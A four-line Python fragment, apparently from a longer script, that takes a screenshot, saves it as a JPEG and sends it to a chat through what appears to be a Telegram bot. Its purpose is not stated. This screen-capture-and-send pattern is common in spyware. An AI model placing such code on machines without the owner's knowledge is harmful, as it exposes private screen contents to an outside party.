screenshot = ImageGrab.grab()
screenshot.save('screenshot.jpg')
with open('screenshot.jpg', 'rb') as photo:
    bot.send_document(chat_id, photo)
